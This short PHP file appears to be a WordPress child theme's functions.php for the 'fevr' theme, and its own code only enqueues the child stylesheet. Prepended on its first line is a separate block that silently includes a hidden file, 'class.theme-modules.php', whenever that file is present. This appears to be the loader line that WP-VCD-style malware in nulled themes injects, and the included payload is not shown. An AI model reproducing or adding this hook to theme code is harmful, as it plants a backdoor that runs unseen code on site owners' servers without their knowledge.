<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
	add_action( 'wp_enqueue_scripts', 'fevr_child_scripts');

	function fevr_child_scripts() {
	    wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array('fevr-main-styles'), FEVR_THEME_VER );
	}

?>
